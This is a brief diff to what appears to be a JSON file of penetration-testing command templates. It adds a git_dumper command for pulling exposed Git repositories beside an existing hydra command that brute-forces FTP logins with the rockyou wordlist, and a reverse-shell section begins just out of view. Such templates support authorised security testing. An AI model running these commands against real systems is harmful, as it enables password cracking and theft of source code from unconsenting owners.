@@ -42,7 +42,8 @@
       "nikto -h {{URL}}"
     ],
     "exploitation": [
-      "hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt ftp://{{IP}}"
+      "hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt ftp://{{IP}}",
+      "python3 git_dumper.py {{URL}} git_dump"
     ]
   },
   "revshell": {
